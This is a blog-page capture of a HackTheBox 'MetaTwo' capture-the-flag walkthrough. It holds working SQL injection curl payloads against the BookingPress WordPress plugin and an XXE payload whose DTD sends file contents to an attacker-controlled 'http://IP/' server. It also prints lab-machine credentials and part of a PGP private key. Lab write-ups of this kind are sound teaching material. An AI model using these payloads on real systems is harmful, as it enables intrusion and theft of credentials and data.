@@ -1,0 +1,396 @@
+<!DOCTYPE html><html class="appearance-dark" lang="en"><head><meta charset="UTF-8"><title>MetaTwo</title><meta name="description" content="This is a blog created by ischyrós"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
+<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/faviconn.png"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="
+
+Information GatheringNMAP
+command used: ( scanning for all the ports fast and efficient)
+sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.11.186 -oG nmap/allPorts
+
+
+command used: ( scanning the ports we got )
+nmap -A -sC -sV -p21,22,80 10.10.11.186 -Pn
+
+
+
+-&amp;gt; All ports scan:
+Not shown: 43073 closed tcp ports (reset), 22459 filtered tcp ports.."><meta name="generator" content="Hexo 5.4.0"></head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">ischyrós's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">MetaTwo</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Information-Gathering"><span class="toc-text">Information Gathering</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NMAP"><span class="toc-text">NMAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Services"><span class="toc-text">Services</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#TCP-21-Default-port-for-FTP"><span class="toc-text">TCP 21 ( Default port for FTP )</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#TCP-22-Default-port-for-SSH"><span class="toc-text">TCP 22 ( Default port for SSH )</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#TCP-80-Default-port-for-HTTP"><span class="toc-text">TCP 80 ( Default port for HTTP )</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#FTP-Enumeration"><span class="toc-text">FTP Enumeration</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#SSH-Connection"><span class="toc-text">SSH Connection</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Information-Gathering-Operating-System"><span class="toc-text">Information Gathering ( Operating System )</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#User"><span class="toc-text">User</span></a></li></ol></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/HackTheBox"><i class="tag post-item-tag">HackTheBox</i></a><a href="/tags/Medium"><i class="tag post-item-tag">Medium</i></a><a href="/tags/Pentesting"><i class="tag post-item-tag">Pentesting</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">MetaTwo</h1><time class="has-text-grey" datetime="2022-12-08T11:40:49.000Z">2022-12-08</time><article class="mt-2 post-content"><img src="/2022/12/08/meta-two/avatar.png" class="">
+
+<h1 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h1><h3 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h3><ul>
+<li><p>command used: ( scanning for all the ports fast and efficient)</p>
+<pre><code class="bash">sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.11.186 -oG nmap/allPorts
+</code></pre>
+</li>
+<li><p>command used: ( scanning the ports we got )</p>
+<pre><code class="bash">nmap -A -sC -sV -p21,22,80 10.10.11.186 -Pn
+</code></pre>
+</li>
+</ul>
+<p>-&gt; All ports scan:</p>
+<pre><code class="bash">Not shown: 43073 closed tcp ports (reset), 22459 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+21/tcp open  ftp     syn-ack ttl 63
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+</code></pre>
+<p>-&gt; All ports scan with flags:</p>
+<pre><code class="bash">PORT   STATE SERVICE VERSION
+21/tcp open  ftp?
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)
+|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)
+|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)
+80/tcp open  http    nginx 1.18.0
+|_http-server-header: nginx/1.18.0
+|_http-title: Did not follow redirect to http://metapress.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<h3 id="Services"><a href="#Services" class="headerlink" title="Services"></a>Services</h3><h6 id="TCP-21-Default-port-for-FTP"><a href="#TCP-21-Default-port-for-FTP" class="headerlink" title="TCP 21 ( Default port for FTP )"></a>TCP 21 ( Default port for FTP )</h6><p>-&gt; Anonymous Authentification:</p>
+<pre><code class="bash">└─$ ftp 10.10.11.186
+Connected to 10.10.11.186.
+220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
+Name (10.10.11.186:kali): anonymous
+331 Password required for anonymous
+Password: 
+530 Login incorrect.
+ftp: Login failed
+</code></pre>
+<h6 id="TCP-22-Default-port-for-SSH"><a href="#TCP-22-Default-port-for-SSH" class="headerlink" title="TCP 22 ( Default port for SSH )"></a>TCP 22 ( Default port for SSH )</h6><p>   -&gt; SSH package version - Might be able to find the OS and version.<br>   -&gt; SSH key fingerprint - Has the key been re-used somewhere (Another machine? Same machine, just another port/service?)<br>    -&gt; SSH banner - Any text (if at all) before the password prompt (often get legal warnings about connecting to it)</p>
+<p>-&gt; SSH package version:</p>
+<pre><code class="bash">nc -vn 10.10.11.186 22
+</code></pre>
+<ul>
+<li>output:<pre><code class="bash">└─$ nc -nv 10.10.11.186 22                                           
+(UNKNOWN) [10.10.11.186] 22 (ssh) open
+</code></pre>
+</li>
+</ul>
+<p>-&gt; SSH key fingerprint:</p>
+<pre><code class="bash">ssh root@10.10.11.186
+</code></pre>
+<ul>
+<li>output:<pre><code class="bash">└─$ ssh root@10.10.11.186
+The authenticity of host &#39;10.10.11.186 (10.10.11.186)&#39; can&#39;t be established.
+RSA key fingerprint is SHA256:75SZkY5Vi8mgCNwavHQo2t6I3P1O/5SUAthmAWKBQOw.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</code></pre>
+</li>
+</ul>
+<h6 id="TCP-80-Default-port-for-HTTP"><a href="#TCP-80-Default-port-for-HTTP" class="headerlink" title="TCP 80 ( Default port for HTTP )"></a>TCP 80 ( Default port for HTTP )</h6><p>-&gt; Web Server:</p>
+<pre><code class="bash">└─$ curl --head http://10.10.11.186                                                      
+HTTP/1.1 302 Moved Temporarily
+Server: nginx/1.18.0
+Date: Fri, 04 Nov 2022 11:56:46 GMT
+Content-Type: text/html
+Content-Length: 145
+Connection: keep-alive
+Location: http://metapress.htb/
+</code></pre>
+<p>We can see that it’s redirecting us to <a target="_blank" rel="noopener" href="http://metapress.htb/">http://metapress.htb/</a> so let’s add the vhost into our <strong>/etc/hosts</strong> file.<br>After adding it we can see that we can successfully view the page:</p>
+<pre><code class="bash">└─$ curl --head http://metapress.htb
+HTTP/1.1 200 OK
+Server: nginx/1.18.0
+Date: Fri, 04 Nov 2022 12:00:34 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: keep-alive
+X-Powered-By: PHP/8.0.24
+Set-Cookie: PHPSESSID=5f4n56vga1sl658au9sjiinn71; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Link: &lt;http://metapress.htb/wp-json/&gt;; rel=&quot;https://api.w.org/&quot;
+</code></pre>
+<p>-&gt; whatweb output:</p>
+<pre><code class="bash">└─$ whatweb http://metapress.htb                       
+http://metapress.htb [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], IP[10.10.11.186], MetaGenerator[WordPress 5.6.2], PHP[8.0.24], PoweredBy[--], Script, Title[MetaPress &amp;#8211; Official company site], UncommonHeaders[link], WordPress[5.6.2], X-Powered-By[PHP/8.0.24], nginx[1.18.0]
+</code></pre>
+<p>We can see that it’s running <strong>WordPress 5.6.2</strong> so let’s enumerate it.</p>
+<p>-&gt; Directory Listing:</p>
+<pre><code class="bash">└─$ gobuster dir -u http://metapress.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://metapress.htb/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/11/04 08:03:28 Starting gobuster in directory enumeration mode
+===============================================================
+/about                (Status: 301) [Size: 0] [--&gt; http://metapress.htb/about-us/]
+/rss                  (Status: 301) [Size: 0] [--&gt; http://metapress.htb/feed/]    
+/login                (Status: 302) [Size: 0] [--&gt; http://metapress.htb/wp-login.php]
+/events               (Status: 301) [Size: 0] [--&gt; http://metapress.htb/events/]     
+/0                    (Status: 301) [Size: 0] [--&gt; http://metapress.htb/0/]          
+/feed                 (Status: 301) [Size: 0] [--&gt; http://metapress.htb/feed/]       
+/atom                 (Status: 301) [Size: 0] [--&gt; http://metapress.htb/feed/atom/]  
+/s                    (Status: 301) [Size: 0] [--&gt; http://metapress.htb/sample-page/]
+/a                    (Status: 301) [Size: 0] [--&gt; http://metapress.htb/about-us/]   
+/c                    (Status: 301) [Size: 0] [--&gt; http://metapress.htb/cancel-appointment/]
+/wp-content           (Status: 301) [Size: 169] [--&gt; http://metapress.htb/wp-content/]      
+/admin                (Status: 302) [Size: 0] [--&gt; http://metapress.htb/wp-admin/]          
+/t                    (Status: 301) [Size: 0] [--&gt; http://metapress.htb/thank-you/]         
+/e                    (Status: 301) [Size: 0] [--&gt; http://metapress.htb/events/]            
+/h                    (Status: 301) [Size: 0] [--&gt; http://metapress.htb/hello-world/]
+</code></pre>
+<p>Going on the <strong>/events/</strong> endpoint and viewing the web page we can see that it’s using the <strong>bookingpress</strong> plugin.<br>Searching on google we found that this plugin is vulnerable to <strong>SQL Injection</strong><br><a target="_blank" rel="noopener" href="https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357">https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357</a></p>
+<p><strong>Basic Details</strong></p>
+<img src="/2022/12/08/meta-two/20221104141359.png" class="">
+
+<p>After that just forward the request and intercept it in order to grab the <strong>wpnonce</strong>.</p>
+<img src="/2022/12/08/meta-two/20221104141500.png" class="">
+<p>Once you’ve done that you are ready to use the exploit.</p>
+<pre><code class="bash">└─$ curl -s &#39;http://metapress.htb/wp-admin/admin-ajax.php&#39; -d &quot;action=bookingpress_front_get_category_services&amp;_wpnonce=f1c5d884ac&amp;category_id=33&amp;total_service=1) union all select database(),1,1,1,1,1,1,1,1-- -&quot;
+
+[&#123;&quot;bookingpress_service_id&quot;:&quot;blog&quot;,&quot;bookingpress_category_id&quot;:&quot;1&quot;,&quot;bookingpress_service_name&quot;:&quot;1&quot;,&quot;bookingpress_service_price&quot;:&quot;$1.00&quot;,&quot;bookingpress_service_duration_val&quot;:&quot;1&quot;,&quot;bookingpress_service_duration_unit&quot;:&quot;1&quot;,&quot;bookingpress_service_description&quot;:&quot;1&quot;,&quot;bookingpress_service_position&quot;:&quot;1&quot;,&quot;bookingpress_servicedate_created&quot;:&quot;1&quot;,&quot;service_price_without_currency&quot;:1,&quot;img_url&quot;:&quot;http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg&quot;&#125;]
+</code></pre>
+<p>After playing with some commands to make it cleaner we got:</p>
+<pre><code class="bash">curl -s &#39;http://metapress.htb/wp-admin/admin-ajax.php&#39; -d &quot;action=bookingpress_front_get_category_services&amp;_wpnonce=f1c5d884ac&amp;category_id=33&amp;total_service=1) union all select database(),1,1,1,1,1,1,1,1-- -&quot; | sed &#39;s/\\//g&#39; | jq | grep service_id | awk &#39;&#123;print $4&#125;&#39; FS=&#39;&quot;&#39;
+
+*blog*
+</code></pre>
+<p>Dumping the information_schema:</p>
+<pre><code class="bash">└─$ curl -s &#39;http://metapress.htb/wp-admin/admin-ajax.php&#39; -d &quot;action=bookingpress_front_get_category_services&amp;_wpnonce=f1c5d884ac&amp;category_id=33&amp;total_service=1) union select all group_concat(schema_name),1,1,1,1,1,1,1,1 from information_schema.schemata-- -&quot; | sed &#39;s/\\//g&#39; | jq | grep service_id | awk &#39;&#123;print $4&#125;&#39; FS=&#39;&quot;&#39;
+
+*information_schema,blog*
+</code></pre>
+<p>Dumping the tables:</p>
+<pre><code class="bash">└─$ curl -s &#39;http://metapress.htb/wp-admin/admin-ajax.php&#39; -d &quot;action=bookingpress_front_get_category_services&amp;_wpnonce=f1c5d884ac&amp;category_id=33&amp;total_service=1) union select all group_concat(table_name),1,1,1,1,1,1,1,1 from information_schema.tables where table_schema = database()-- -&quot; | sed &#39;s/\\//g&#39; | jq | grep service_id | awk &#39;&#123;print $4&#125;&#39; FS=&#39;&quot;&#39;
+
+*wp_options,wp_term_taxonomy,wp_bookingpress_servicesmeta,wp_commentmeta,wp_users,wp_bookingpress_customers_meta,wp_bookingpress_settings,wp_bookingpress_appointment_bookings,wp_bookingpress_customize_settings,wp_bookingpress_debug_payment_log,wp_bookingpress_services,wp_termmeta,wp_links,wp_bookingpress_entries,wp_bookingpress_categories,wp_bookingpress_customers,wp_bookingpress_notifications,wp_usermeta,wp_terms,wp_bookingpress_default_daysoff,wp_comments,wp_bookingpress_default_workhours,wp_postmeta,wp_bookingpress_form_fields,wp_bookingpress_payment_logs,wp_posts,wp_term_relationships*
+</code></pre>
+<p>Dumping the users from <strong>wp_users</strong>:</p>
+<pre><code class="bash">└─$ curl -s &#39;http://metapress.htb/wp-admin/admin-ajax.php&#39; -d &quot;action=bookingpress_front_get_category_services&amp;_wpnonce=f1c5d884ac&amp;category_id=33&amp;total_service=1) union select all group_concat(user_login),1,1,1,1,1,1,1,1 from wp_users-- -&quot; | sed &#39;s/\\//g&#39; | jq | grep service_id | awk &#39;&#123;print $4&#125;&#39; FS=&#39;&quot;&#39;
+
+*admin,manager*
+</code></pre>
+<p>Dumping the <strong>hashes</strong>:</p>
+<pre><code class="bash">└─$ curl -s &#39;http://metapress.htb/wp-admin/admin-ajax.php&#39; -d &quot;action=bookingpress_front_get_category_services&amp;_wpnonce=f1c5d884ac&amp;category_id=33&amp;total_service=1) union select all group_concat(user_pass),1,1,1,1,1,1,1,1 from wp_users-- -&quot; | sed &#39;s/\\//g&#39; | jq | grep service_id | awk &#39;&#123;print $4&#125;&#39; FS=&#39;&quot;&#39;
+
+$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.,$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
+</code></pre>
+<p>Now that we have the hashes we can try to crack them in order to retrieve the passwords. We can do this using <strong>John The Ripper</strong>:</p>
+<pre><code class="bash">└─$ sudo john pass.hash --wordlist=/opt/rockyou.txt 
+[sudo] password for kali: 
+Created directory: /root/.john
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 4 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+partylikearockstar (manager)
+</code></pre>
+<p>Now with that password we could log into the <strong>wordpress admin panel</strong> and try to get a shell from there.</p>
+<img src="/2022/12/08/meta-two/20221104142717.png" class="">
+
+<p>After logging in we can see that we just have the <strong>media</strong> functionality.</p>
+<img src="/2022/12/08/meta-two/20221104142904.png" class="">
+
+<p>So with that info in mind we can try to search for some exploits. After a while I found this interesting blog that it’s exploiting this using <strong>XXE</strong><br><a target="_blank" rel="noopener" href="https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/">https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/</a><br>With this we can try to extract wthe <strong>wp_config.php</strong> file.</p>
+<p><strong>payload.wav</strong>:</p>
+<pre><code class="bash">echo -en &#39;RIFF\x85\x00\x00\x00WAVEiXML\x79\x00\x00\x00&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &#39;&quot;&#39;&quot;&#39;http://IP/pwned.dtd&#39;&quot;&#39;&quot;&#39;&gt;%remote;%init;%trick;]&gt;\x00&#39; &gt; payload.wav
+</code></pre>
+<p><strong>pwned.dtd</strong>:</p>
+<pre><code class="bash">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/hostname&quot;&gt;
+&lt;!ENTITY % init &quot;&lt;!ENTITY &amp;#x25; trick SYSTEM &#39;http://IP/?p=%file;&#39;&gt;&quot; &gt;
+</code></pre>
+<p>Now once you run it you will receive the <strong>wp_config.php</strong> file as a base64 string in the python server:</p>
+<pre><code class="bash">&gt; sudo python3 -m http.server 80
+
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.63.197 - - &quot;GET /pwned.dtd HTTP/1.1&quot; 200 -
+10.129.63.197 - - &quot;GET /?p=PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg== HTTP/1.1&quot; 200 -
+</code></pre>
+<p><strong>wp_config.php</strong>:</p>
+<pre><code class="php">└─$ cat wp_config.php 
+&lt;?php
+/** The name of the database for WordPress */
+define( &#39;DB_NAME&#39;, &#39;blog&#39; );
+/** MySQL database username */
+define( &#39;DB_USER&#39;, &#39;blog&#39; );
+/** MySQL database password */
+define( &#39;DB_PASSWORD&#39;, &#39;635Aq@TdqrCwXFUZ&#39; );
+/** MySQL hostname */
+define( &#39;DB_HOST&#39;, &#39;localhost&#39; );
+/** Database Charset to use in creating database tables. */
+define( &#39;DB_CHARSET&#39;, &#39;utf8mb4&#39; );
+/** The Database Collate type. Don&#39;t change this if in doubt. */
+define( &#39;DB_COLLATE&#39;, &#39;&#39; );
+define( &#39;FS_METHOD&#39;, &#39;ftpext&#39; );
+define( &#39;FTP_USER&#39;, &#39;metapress.htb&#39; );
+define( &#39;FTP_PASS&#39;, &#39;9NYS_ii@FyL_p5M2NvJ&#39; );
+define( &#39;FTP_HOST&#39;, &#39;ftp.metapress.htb&#39; );
+define( &#39;FTP_BASE&#39;, &#39;blog/&#39; );
+define( &#39;FTP_SSL&#39;, false );
+</code></pre>
+<p>Now with those credentials we can try to log in on <strong>FTP</strong>:</p>
+<pre><code class="bash">└─$ ftp 10.10.11.186
+Connected to 10.10.11.186.
+220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
+Name (10.10.11.186:kali): metapress.htb
+331 Password required for metapress.htb
+Password: 
+230 User metapress.htb logged in
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||30551|)
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5 14:12 blog
+drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5 14:12 mailer
+226 Transfer complete
+</code></pre>
+<h6 id="FTP-Enumeration"><a href="#FTP-Enumeration" class="headerlink" title="FTP Enumeration"></a>FTP Enumeration</h6><img src="/2022/12/08/meta-two/20221104143904.png" class="">
+
+<p>We can see that it’s using an email system so most probably it will have some credentials stored there for the email that we can probably use to connect on the <strong>SSH</strong><br><strong>send_mail.php</strong>:</p>
+<pre><code class="php">└─$ cat send_email.php 
+[...]
+$mail-&gt;Host = &quot;mail.metapress.htb&quot;;
+$mail-&gt;SMTPAuth = true;                          
+$mail-&gt;Username = &quot;jnelson@metapress.htb&quot;;                 
+$mail-&gt;Password = &quot;Cb4_JmWM8zUZWMu@Ys&quot;;                           
+$mail-&gt;SMTPSecure = &quot;tls&quot;;                           
+$mail-&gt;Port = 587;                                   
+</code></pre>
+<h6 id="SSH-Connection"><a href="#SSH-Connection" class="headerlink" title="SSH Connection"></a>SSH Connection</h6><img src="/2022/12/08/meta-two/20221104144103.png" class="">
+
+<h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><h3 id="Information-Gathering-Operating-System"><a href="#Information-Gathering-Operating-System" class="headerlink" title="Information Gathering ( Operating System )"></a>Information Gathering ( Operating System )</h3><pre><code class="bash">jnelson@meta2:~$ cat /etc/*-release
+PRETTY_NAME=&quot;Debian GNU/Linux 11 (bullseye)&quot;
+NAME=&quot;Debian GNU/Linux&quot;
+VERSION_ID=&quot;11&quot;
+VERSION=&quot;11 (bullseye)&quot;
+VERSION_CODENAME=bullseye
+ID=debian
+HOME_URL=&quot;https://www.debian.org/&quot;
+SUPPORT_URL=&quot;https://www.debian.org/support&quot;
+BUG_REPORT_URL=&quot;https://bugs.debian.org/&quot;
+</code></pre>
+<h3 id="User"><a href="#User" class="headerlink" title="User"></a>User</h3><pre><code class="bash">jnelson@meta2:~$ id
+uid=1000(jnelson) gid=1000(jnelson) groups=1000(jnelson)
+jnelson@meta2:~$ groups
+jnelson
+jnelson@meta2:~$ ls -lah
+total 32K
+drwxr-xr-x 4 jnelson jnelson 4.0K Oct 25 12:53 .
+drwxr-xr-x 3 root    root    4.0K Oct  5 15:12 ..
+lrwxrwxrwx 1 root    root       9 Jun 26 15:59 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 jnelson jnelson  220 Jun 26 15:46 .bash_logout
+-rw-r--r-- 1 jnelson jnelson 3.5K Jun 26 15:46 .bashrc
+drwxr-xr-x 3 jnelson jnelson 4.0K Oct 25 12:51 .local
+dr-xr-x--- 3 jnelson jnelson 4.0K Oct 25 12:52 .passpie
+-rw-r--r-- 1 jnelson jnelson  807 Jun 26 15:46 .profile
+-rw-r----- 1 root    jnelson   33 Nov  4 12:35 user.txt
+</code></pre>
+<p>We can see that this user has a <strong>.passpie</strong> folder with a <strong>.keys</strong> file.</p>
+<pre><code class="bash">jnelson@meta2:~/.passpie$ cat .keys | tail -n 45
+-----BEGIN PGP PRIVATE KEY BLOCK-----
+
+lQUBBGK4V9YRDADENdPyGOxVM7hcLSHfXg+21dENGedjYV1gf9cZabjq6v440NA1
+AiJBBC1QUbIHmaBrxngkbu/DD0gzCEWEr2pFusr/Y3yY4codzmteOW6Rg2URmxMD
+/GYn9FIjUAWqnfdnttBbvBjseL4sECpmgxTIjKbWAXlqgEgNjXD306IweEy2FOho
+3LpAXxfk8C/qUCKcpxaz0G2k0do4+VTKZ+5UDpqM5++soJqhCrUYudb9zyVyXTpT
+ZjMvyXe5NeC7JhBCKh+/Wqc4xyBcwhDdW+WU54vuFUthn+PUubEN1m+s13BkyvHV
+gNAM4v6terRItXdKvgvHtJxE0vhlNSjFAedACHC4sN+dRqFu4li8XPIVYGkuK9pX
